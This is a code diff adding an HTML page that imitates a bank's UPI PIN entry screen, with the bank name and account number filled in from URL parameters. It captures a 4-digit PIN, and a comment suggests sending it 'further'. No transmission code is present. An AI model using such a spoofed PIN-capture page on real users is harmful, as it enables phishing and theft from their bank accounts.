@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <title>Enter UPI PIN</title>
+<style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #FFFFFF;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #fff;
+            padding: 14px 20px;
+            z-index: 100;
+            border-bottom: 1px solid #ddd;
+        }
+        .cancel-btn {
+            font-size: 16px;
+            color: #000;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        /* Top row (Bank name + UPI logo) - OUTSIDE the grey bar */
+        .top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 10px 0px;
+            font-weight: 700;
+            background: #FFFFFF;
+            margin-top: calc(env(safe-area-inset-top, 50px) + 50px);
+        }
+        .bank-name {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000000;
+        }
+        .upi-logo {
+            height: 36px;
+        }
+
+        /* Grey bar - ONLY the account number inside */
+        .account-bar {
+            background: #f0f0f0;
+           padding: 2px 8px 38px;
+
+        }
+        .account-number {
+            font-size: 10px;
+            font-weight: bold;
+            color: #000000;
+            letter-spacing: 3px;
+            text-align: start;
+        }
+
+        /* PIN Section */
+        .pin-section {
+            padding: 80px 20px 40px;
+            text-align: center;
+        }
+        .pin-title {
+            font-size: 14px;
+            font-weight: bold;
+            color: #504f4f;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 120px;
+        }
+        .pin-dot {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #bbb;
+            border-radius: 50%;
+            background: transparent;
+        }
+        .pin-dot.filled {
+            background: #000;
+            border-color: #000;
+        }
+        .pin-note {
+            font-size: 12px;
+            color: #777;
+            line-height: 1.6;
+            max-width: 340px;
+            margin: 0 auto;
+        }
+
+        /* Hidden input for phone numeric keypad */
+        #pin-input {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            height: 1px;
+            width: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden input to auto-trigger phone's numeric keypad -->
+    <input 
+        type="text" 
+        inputmode="numeric" 
+        pattern="[0-9]*" 
+        maxlength="4" 
+        id="pin-input" 
+        autofocus 
+    />
+
+    <!-- Header -->
+    <header class="header">
+        <div class="cancel-btn" onclick="history.back()">Cancel</div>
+    </header>
+
+    <!-- Top row: Dynamic bank name + short account id + UPI logo -->
+    <div class="top-row">
+        <div class="bank-info">
+            <div class="bank-name" id="bankName">Federal Bank</div>
+            <div class="acc-id" id="shortAcc">XXXX2071</div>
+        </div>
+        <img class="upi-logo" src="upi.svg" alt="UPI">
+    </div>
+
+    <!-- Grey bar: Dynamic full account number -->
+    <div class="account-bar">
+        <div class="account-number" id="fullAcc">XXXXXXXXXX2071</div>
+    </div>
+
+    <!-- PIN Section -->
+    <div class="pin-section">
+        <div class="pin-title">Enter 4-digit UPI PIN</div>
+        <div class="pin-dots">
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+        </div>
+        <div class="pin-note">
+            UPI PIN will keep your account secure from unauthorized access. Do not share this PIN with anyone.
+        </div>
+    </div>
+
+    <script>
+        // Read URL parameters sent from balance_checker.html
+        const urlParams = new URLSearchParams(window.location.search);
+
+        const bankName = urlParams.get('bank') || 'Federal Bank';
+        const shortAcc = urlParams.get('short') || 'XXXX2071';
+        const fullAcc = urlParams.get('full') || 'XXXXXXXXXX2071';
+
+        // Dynamically update the content
+        document.getElementById('bankName').textContent = bankName;
+        document.getElementById('shortAcc').textContent = shortAcc;
+        document.getElementById('fullAcc').textContent = fullAcc;
+
+        // PIN handling (unchanged)
+        const dots = document.querySelectorAll('.pin-dot');
+        const hiddenInput = document.getElementById('pin-input');
+        let pin = '';
+
+        window.addEventListener('load', () => {
+            hiddenInput.focus();
+        });
+
+        hiddenInput.addEventListener('input', (e) => {
+            const value = e.target.value.replace(/\D/g, '');
+            pin = value.slice(0, 4);
+            e.target.value = pin;
+
+            dots.forEach((dot, index) => {
+                if (index < pin.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            });
+
+            if (pin.length === 4) {
+                setTimeout(() => {
+                    alert('PIN submitted successfully: ' + pin);
+                    // You can redirect or send data further here
+                }, 300);
+            }
+        });
+    </script>
+
+</body>
+</html>
